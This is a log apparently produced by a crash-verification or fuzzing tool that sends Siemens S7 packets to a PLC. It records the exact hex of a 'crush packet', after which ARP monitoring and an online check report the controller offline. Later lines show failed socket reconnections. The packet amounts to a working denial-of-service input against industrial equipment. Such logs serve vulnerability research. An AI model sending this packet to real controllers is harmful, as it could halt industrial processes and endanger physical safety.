[2021-12-19 20:00:24,548] [INFO] [verifyClient.connect] -> Start connect PLC
[2021-12-19 20:00:24,624] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect request]0300001902f08032010000010000080000f000000a000a00f0
[2021-12-19 20:00:24,624] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300000100000800000000f0000003000300f0
[2021-12-19 20:00:24,626] [INFO] [verifyClient.passiveDetect] -> start listen arp
[2021-12-19 20:00:24,626] [INFO] [vertifyPassiveARP.<module>] -> The Crush Packet is 55
[2021-12-19 20:00:24,628] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000200000800080001120411440100ff090004001c0000
[2021-12-19 20:00:24,836] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000300000800080001120411440100ff090004001c0000
[2021-12-19 20:00:25,054] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000400000800080001120411440100ff090004001c0000
[2021-12-19 20:00:25,257] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000500000800080001120411440100ff090004001c0000
[2021-12-19 20:00:25,462] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000600000800080001120411440100ff090004001c0000
[2021-12-19 20:00:25,668] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000700000800080001120411440100ff090004001c0000
[2021-12-19 20:00:25,870] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000800000800080001120411440100ff090004001c0000
[2021-12-19 20:00:26,078] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000900000800080001120411440100ff090004001c0000
[2021-12-19 20:00:26,281] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000a00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:26,487] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000b00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:26,690] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000c00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:26,895] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000d00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:27,100] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000e00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:27,305] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000f00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:27,508] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001000000800080001120411440100ff090004001c0000
[2021-12-19 20:00:27,710] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001100000800080001120411440100ff090004001c0000
[2021-12-19 20:00:27,915] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001200000800080001120411440100ff090004001c0000
[2021-12-19 20:00:28,120] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001300000800080001120411440100ff090004001c0000
[2021-12-19 20:00:28,324] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001400000800080001120411440100ff090004001c0000
[2021-12-19 20:00:28,528] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001500000800080001120411440100ff090004001c0000
[2021-12-19 20:00:28,734] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001600000800080001120411440100ff090004001c0000
[2021-12-19 20:00:28,937] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001700000800080001120411440100ff090004001c0000
[2021-12-19 20:00:29,156] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001800000800080001120411440100ff090004001c0000
[2021-12-19 20:00:29,359] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001900000800080001120411440100ff090004001c0000
[2021-12-19 20:00:29,564] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001a00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:29,769] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001b00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:29,971] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001c00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:30,177] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001d00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:30,381] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001e00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:30,598] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001f00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:30,805] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002000000800080001120411440100ff090004001c0000
[2021-12-19 20:00:31,009] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002100000800080001120411440100ff090004001c0000
[2021-12-19 20:00:31,216] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002200000800080001120411440100ff090004001c0000
[2021-12-19 20:00:31,421] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002300000800080001120411440100ff090004001c0000
[2021-12-19 20:00:31,628] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002400000800080001120411440100ff090004001c0000
[2021-12-19 20:00:31,833] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002500000800080001120411440100ff090004001c0000
[2021-12-19 20:00:32,040] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002600000800080001120411440100ff090004001c0000
[2021-12-19 20:00:32,247] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002700000800080001120411440100ff090004001c0000
[2021-12-19 20:00:32,450] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002800000800080001120411440100ff090004001c0000
[2021-12-19 20:00:32,653] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002900000800080001120411440100ff090004001c0000
[2021-12-19 20:00:32,859] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002a00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:33,077] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002b00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:33,282] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002c00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:33,487] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002d00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:33,692] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002e00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:33,897] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002f00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:34,101] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003000000800080001120411440100ff090004001c0000
[2021-12-19 20:00:34,305] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003100000800080001120411440100ff090004001c0000
[2021-12-19 20:00:34,522] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003200000800080001120411440100ff090004001c0000
[2021-12-19 20:00:34,729] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003300000800080001120411440100ff090004001c0000
[2021-12-19 20:00:34,932] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003400000800080001120411440100ff090004001c0000
[2021-12-19 20:00:35,140] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003500000800080001120411440100ff090004001c0000
[2021-12-19 20:00:35,345] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003600000800080001120411440100ff090004001c0000
[2021-12-19 20:00:35,550] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003700000800080001120411440100ff090004001c0000
[2021-12-19 20:00:35,754] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003800000800080001120411440100ff090004001c0000
[2021-12-19 20:00:36,266] [INFO] [verifyClient.send_s7_packet] -> Send the crush packet
[2021-12-19 20:00:36,267] [INFO] [verifyClient.send_s7_packet] -> [request]0300001f02f080320100003900000e00000401120a10010003000083000001
[2021-12-19 20:00:36,479] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003a00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:36,686] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003b00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:36,889] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003c00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:37,094] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003d00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:37,312] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003e00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:37,517] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003f00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:37,724] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004000000800080001120411440100ff090004001c0000
[2021-12-19 20:00:37,928] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004100000800080001120411440100ff090004001c0000
[2021-12-19 20:00:38,133] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004200000800080001120411440100ff090004001c0000
[2021-12-19 20:00:38,341] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004300000800080001120411440100ff090004001c0000
[2021-12-19 20:00:38,546] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004400000800080001120411440100ff090004001c0000
[2021-12-19 20:00:38,752] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004500000800080001120411440100ff090004001c0000
[2021-12-19 20:00:38,955] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004600000800080001120411440100ff090004001c0000
[2021-12-19 20:00:39,162] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004700000800080001120411440100ff090004001c0000
[2021-12-19 20:00:39,366] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004800000800080001120411440100ff090004001c0000
[2021-12-19 20:00:39,573] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004900000800080001120411440100ff090004001c0000
[2021-12-19 20:00:39,775] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004a00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:39,990] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004b00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:40,195] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004c00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:40,398] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004d00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:40,602] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004e00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:40,805] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004f00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:41,012] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005000000800080001120411440100ff090004001c0000
[2021-12-19 20:00:41,218] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005100000800080001120411440100ff090004001c0000
[2021-12-19 20:00:41,425] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005200000800080001120411440100ff090004001c0000
[2021-12-19 20:00:41,630] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005300000800080001120411440100ff090004001c0000
[2021-12-19 20:00:41,838] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005400000800080001120411440100ff090004001c0000
[2021-12-19 20:00:42,043] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005500000800080001120411440100ff090004001c0000
[2021-12-19 20:00:42,249] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005600000800080001120411440100ff090004001c0000
[2021-12-19 20:00:42,456] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005700000800080001120411440100ff090004001c0000
[2021-12-19 20:00:42,662] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005800000800080001120411440100ff090004001c0000
[2021-12-19 20:00:42,866] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005900000800080001120411440100ff090004001c0000
[2021-12-19 20:00:43,074] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005a00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:43,279] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005b00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:43,486] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005c00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:43,692] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005d00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:43,898] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005e00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:44,104] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005f00000800080001120411440100ff090004001c0000
[2021-12-19 20:00:44,307] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006000000800080001120411440100ff090004001c0000
[2021-12-19 20:00:44,512] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006100000800080001120411440100ff090004001c0000
[2021-12-19 20:00:44,718] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006200000800080001120411440100ff090004001c0000
[2021-12-19 20:00:44,924] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006300000800080001120411440100ff090004001c0000
[2021-12-19 20:00:45,129] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006400000800080001120411440100ff090004001c0000
[2021-12-19 20:00:45,337] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006500000800080001120411440100ff090004001c0000
[2021-12-19 20:00:45,542] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006600000800080001120411440100ff090004001c0000
[2021-12-19 20:00:45,717] [INFO] [vertifyPassiveARP.passiveCallback] -> passiveDetect find a Crush
[2021-12-19 20:00:45,748] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:00:57,791] [INFO] [verifyClient.activeDetect] -> the PLC is offline
[2021-12-19 20:00:57,792] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 101 ,passiveDetected find a Crush, The activeDetect ans is Crush
[2021-12-19 20:01:03,083] [INFO] [verifyClient.connect] -> Start connect PLC
[2021-12-19 20:01:04,764] [ERROR] [verifyClient.send_receive_packet] -> file descriptor cannot be a negative integer (-1)
[2021-12-19 20:01:04,768] [ERROR] [verifyClient.send_receive_s7_packet] -> file descriptor cannot be a negative integer (-1)
[2021-12-19 20:01:06,780] [INFO] [verifyClient.passiveDetect] -> start listen arp
[2021-12-19 20:01:06,780] [INFO] [vertifyPassiveARP.<module>] -> The Crush Packet is 10
[2021-12-19 20:01:06,786] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10038] 在一个非套接字上尝试了一个操作。
[2021-12-19 20:01:07,000] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10038] 在一个非套接字上尝试了一个操作。
[2021-12-19 20:01:07,206] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10038] 在一个非套接字上尝试了一个操作。
[2021-12-19 20:01:07,412] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10038] 在一个非套接字上尝试了一个操作。
[2021-12-19 20:01:07,613] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10038] 在一个非套接字上尝试了一个操作。
[2021-12-19 20:01:07,819] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10038] 在一个非套接字上尝试了一个操作。
[2021-12-19 20:01:08,024] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10038] 在一个非套接字上尝试了一个操作。
[2021-12-19 20:01:08,228] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10038] 在一个非套接字上尝试了一个操作。
[2021-12-19 20:01:08,437] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10038] 在一个非套接字上尝试了一个操作。
[2021-12-19 20:01:08,642] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10038] 在一个非套接字上尝试了一个操作。
[2021-12-19 20:01:08,844] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10038] 在一个非套接字上尝试了一个操作。
[2021-12-19 20:01:09,049] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10038] 在一个非套接字上尝试了一个操作。
[2021-12-19 20:01:09,254] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10038] 在一个非套接字上尝试了一个操作。
